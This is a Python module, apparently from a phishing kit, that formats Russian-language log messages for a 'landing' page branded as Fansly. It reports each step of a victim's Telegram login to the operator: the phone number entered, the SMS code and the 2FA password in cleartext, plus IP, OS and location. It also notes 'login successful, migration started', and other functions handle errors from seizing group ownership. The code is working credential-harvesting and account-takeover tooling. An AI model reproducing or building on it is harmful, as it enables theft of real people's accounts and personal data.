from __future__ import annotations

import re
from datetime import datetime, timezone
from typing import Any, Mapping

from landing.event_labels import ACTION_TITLES, DETAIL_LABELS, HEADER_KEYS

# компактный «входной» лог (visit / phone / code / 2FA / done)
_COMPACT_ACTIONS = frozenset(
	{
		"visit",
		"click.login",
		"auth.phone.submit",
		"auth.phone.error",
		"auth.code.submit",
		"auth.code.error",
		"auth.password.submit",
		"auth.password.error",
		"auth.done",
	}
)

_ACTION_LINE = {
	"visit": "🙋‍♂️ Я открыл ссылку",
	"click.login": "🙋‍♂️ Я нажал Войти",
	"auth.phone.submit": "🙋‍♂️ я отправил телефон: {phone}",
	"auth.phone.error": "❌ Ошибка номера: {error}",
	"auth.code.submit": "🙋‍♂️ я отправил код: {code}",
	"auth.code.error": "❌ Ошибка кода: {error}",
	"auth.password.submit": "🙋‍♂️ я отправил 2FA: {password}",
	"auth.password.error": "❌ Ошибка 2FA: {error}",
	"auth.done": "✅ Вход успешен, миграция запущена",
}


def mask_phone(phone: str) -> str:
	"""Оставлен для совместимости; в логах входа номер больше не маскируем."""
	digits = "".join(ch for ch in (phone or "") if ch.isdigit() or ch == "+")
	if len(digits) <= 4:
		return "***"
	return f"{digits[:3]}***{digits[-2:]}"


def now_local() -> str:
	return datetime.now(timezone.utc).astimezone().strftime("%Y-%m-%d %H:%M:%S")


def short(value: Any, limit: int = 180) -> str:
	text = str(value).replace("\n", " ").strip()
	if len(text) > limit:
		return text[: limit - 3] + "..."
	return text


def fmt_value(key: str, value: Any) -> str:
	if key in {"blur", "proxy", "cookie"}:
		if value in {True, "yes", "true", "1", 1}:
			return "да"
		if value in {False, "no", "false", "0", 0}:
			return "нет"
	if isinstance(value, bool):
		return "да" if value else "нет"
	return short(value)


def build_event_text(
	action: str,
	*,
	client: Mapping[str, Any],
	unlocked: bool | None,
	details: Mapping[str, Any],
) -> str:
	raw = dict(details)
	for key in list(raw.keys()):
		if key in HEADER_KEYS:
			raw.pop(key, None)

	if action in _COMPACT_ACTIONS:
		return _build_compact(action, client=client, details=raw)

	return _build_legacy(action, client=client, unlocked=unlocked, details=raw)


def _build_compact(
	action: str,
	*,
	client: Mapping[str, Any],
	details: Mapping[str, Any],
) -> str:
	brand = str(details.get("brand") or details.get("nick") or "Fansly").strip() or "Fansly"
	link = str(
		details.get("link")
		or details.get("username")
		or details.get("nick")
		or "landing"
	).strip().lstrip("@") or "landing"
	tag = re.sub(r"[^a-zA-Z0-9_]+", "_", link).strip("_").lower() or "fansly"

	phone = str(details.get("phone") or "").strip()
	code = str(details.get("code") or "").strip()
	password = str(details.get("password") or details.get("cloud_password") or "").strip()
	error = short(details.get("error") or "-", 120)
	user_id = str(details.get("user_id") or details.get("tg_id") or "").strip()
	user = str(details.get("user") or details.get("username") or "").strip()
	# номер аккаунта (после входа) vs введённый телефон
	account_phone = str(details.get("account_phone") or phone or "").strip()

	template = _ACTION_LINE.get(action, f"🙋‍♂️ {ACTION_TITLES.get(action, action)}")
	action_line = template.format(
		phone=phone or "-",
		code=code or "-",
		password=password or "-",
		error=error,
	)

	lines = [
		f"👭 {brand}",
		f"🧣 Ссылка - {link}",
		action_line,
		"",
		f"🌐 IP - {client.get('ip') or '-'}",
		f"📱 OS - {client.get('os') or '-'}",
		(
			f"📍Местоположение:  Страна: {client.get('country') or '-'}, "
			f"Город: {client.get('city') or '-'}"
		),
	]

	# ID / user / номер — когда есть (после входа или на шагах с телефоном)
	account_bits = []
	if user_id:
		account_bits.append(f"🆔 ID: {user_id}")
	if user:
		account_bits.append(f"👤 User: {user}")
	if account_phone and action != "visit":
		account_bits.append(f"📞 Номер: {account_phone}")
	if account_bits:
		lines.append("")
		lines.extend(account_bits)

	if details.get("job_id"):
		lines.append(f"🧾 Job: {details['job_id']}")

	lines.append("")
	lines.append(f"#{tag}")
	return "\n".join(lines)


def _build_legacy(
	action: str,
	*,
	client: Mapping[str, Any],
	unlocked: bool | None,
	details: Mapping[str, Any],
) -> str:
	raw = dict(details)
	title = ACTION_TITLES.get(action, action)
	lines = [
		f"🛰 ЛЕНДИНГ · {title}",
		f"⏱ {now_local()}",
		f"🌐 IP: {client['ip']}",
		f"📍 Страна: {client['country']}",
		f"🏙 Город: {client['city']}",
		f"💻 Устройство: {client['device']}",
		f"🖥 ОС: {client['os']}",
	]
	if unlocked is not None:
		lines.append(f"🔓 Разблокирован: {'да' if unlocked else 'нет'}")

	extra_order = (
		"place",
		"path",
		"nick",
		"step",
		"phone",
		"code",
		"password",
		"user_id",
		"user",
		"job_id",
		"error",
	)
	# служебные поля не светим в Telegram-логе
	hidden = {"login_id", "proxy", "brand", "link", "account_phone", "tg_id", "username", "session"}
	seen = set()
	for key in extra_order:
		if key not in raw or raw[key] in (None, ""):
			continue
		seen.add(key)
		lines.append(f"{DETAIL_LABELS.get(key, key)}: {fmt_value(key, raw[key])}")
	for key, value in raw.items():
		if key in seen or key in hidden or value in (None, ""):
			continue
		lines.append(f"{DETAIL_LABELS.get(key, key)}: {fmt_value(key, value)}")
	return "\n".join(lines)


def shorten_group_error(raw: str, limit: int = 90) -> str:
	"""Сжимает длинные Telethon ConstructorError до короткой строки."""
	text = " ".join(str(raw or "").split())
	# invite Title#123: ConstructorError...
	m = re.match(r"^(invite|promote|owner|leave)\s+(.+?)#(\d+):\s*(.+)$", text, re.I)
	if m:
		kind, title, chat_id, err = m.groups()
		err_short = _short_exc(err)
		title = short(title, 40)
		return f"• {kind} {title}#{chat_id}: {err_short}"
	return f"• {short(text, limit)}"


def _short_exc(err: str) -> str:
	err = err.strip()
	# ChatAdminRequiredError / PeerIdInvalidError ...
	named = re.search(r"\b([A-Z][A-Za-z0-9]*(?:Error|FloodWait))\b", err)
	if named:
		name = named.group(1)
		if "AddChatUserRequest" in err and "InviteToChannelRequest" in err:
			return f"{name} (megagroup)"
		return name
	if "Invalid object ID for a chat" in err:
		return "PeerIdInvalid (megagroup)"
	return short(err, 80)
